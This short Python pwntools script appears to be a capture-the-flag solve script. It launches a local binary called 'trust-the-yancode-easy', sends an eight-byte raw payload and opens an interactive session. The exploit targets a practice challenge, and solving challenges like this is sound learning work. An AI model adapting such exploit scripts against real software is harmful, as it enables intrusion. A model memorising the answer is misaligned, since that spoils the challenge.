#!/usr/bin/python3

from pwn import *

context.log_level = 'error'
context.arch = 'amd64'

elf = context.binary = ELF("./trust-the-yancode-easy")

io = process()

payload = b"\xda\xce\xc0\xaf\x4f\x6f\x04\x43"

io.send(payload)

io.interactive()
